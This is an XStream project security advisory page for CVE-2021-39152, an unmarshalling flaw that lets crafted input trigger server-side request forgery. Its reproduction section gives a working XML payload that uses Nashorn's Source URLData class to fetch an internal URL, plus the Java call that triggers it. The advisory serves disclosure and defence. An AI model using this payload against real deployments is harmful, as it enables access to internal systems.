<html>
<!--
 Copyright (C) 2021 XStream committers.
 All rights reserved.
 
 The software in this package is published under the terms of the BSD
 style license a copy of which has been included with this distribution in
 the LICENSE.txt file.
 
 Created on 10. July 2021 by Joerg Schaible
 -->
  <head>
    <title>CVE-2021-39152</title>
  </head>
  <body>

    <h2 id="vulnerability">Vulnerability</h2>
    
    <p>CVE-2021-39152: A Server-Side Forgery Request can be activated unmarshalling with XStream to access data streams
    from an arbitrary URL referencing a resource in an intranet or the local host.</p>
    
    <h2 id="affected_versions">Affected Versions</h2>
    
    <p>All versions until and including version 1.4.17 are affected, if using the version out of the box with Java
    runtime version 14 to 8.  No user is affected, who followed the recommendation to setup
    <a href="security.html#framework">XStream's security framework</a> with a whitelist limited to the minimal
    required types.</p>

    <h2 id="description">Description</h2>
    
    <p>The processed stream at unmarshalling time contains type information to recreate the formerly written objects.
    XStream creates therefore new instances based on these type information.  An attacker can manipulate the processed
    input stream and replace or inject objects, that result in a server-side forgery request.</p>

    <h2 id="reproduction">Steps to Reproduce</h2>

    <p>Create a simple HashMap and use XStream to marshal it to XML.  Replace the XML with following snippet and
    unmarshal it again with XStream:</p>
<div class="Source XML"><pre>&lt;map&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;
      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;
      &lt;cs&gt;GBK&lt;/cs&gt;
      &lt;hash&gt;1111&lt;/hash&gt;
      &lt;array&gt;b&lt;/array&gt;
      &lt;length&gt;0&lt;/length&gt;
      &lt;lastModified&gt;0&lt;/lastModified&gt;
    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;
    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/&gt;
  &lt;/entry&gt;
  &lt;entry&gt;
    &lt;jdk.nashorn.internal.runtime.Source_-URLData&gt;
      &lt;url&gt;http://localhost:8080/internal/&lt;/url&gt;
      &lt;cs reference='../../../entry/jdk.nashorn.internal.runtime.Source_-URLData/cs'/&gt;
      &lt;hash&gt;1111&lt;/hash&gt;
      &lt;array&gt;b&lt;/array&gt;
      &lt;length&gt;0&lt;/length&gt;
      &lt;lastModified&gt;0&lt;/lastModified&gt;
    &lt;/jdk.nashorn.internal.runtime.Source_-URLData&gt;
    &lt;jdk.nashorn.internal.runtime.Source_-URLData reference='../jdk.nashorn.internal.runtime.Source_-URLData'/&gt;
  &lt;/entry&gt;
&lt;/map&gt;
</pre></div>
<div class="Source Java"><pre>XStream xstream = new XStream();
xstream.fromXML(xml);
</pre></div>

    <p>As soon as the XML gets unmarshalled, the payload gets executed and the data from the URL location is collected.</p>

    <p>Note, this example uses XML, but the attack can be performed for any supported format. e.g. JSON.</p>

    <h2 id="impact">Impact</h2>

	<p>The vulnerability may allow a remote attacker to request data from internal resources that are not publicly
	available only by manipulating the processed input stream.</p>

    <h2 id="workarounds">Workarounds</h2>

    <p>See <a href="security.html#workaround">workarounds</a> for the different versions covering all CVEs.</p>

    <h2 id="credits">Credits</h2>
    
    <p>m0d9 of the Security Team of Alibaba Cloud found and reported the issue to XStream and provided the required
    information to reproduce it.</p>
    
      </body>
 </html>
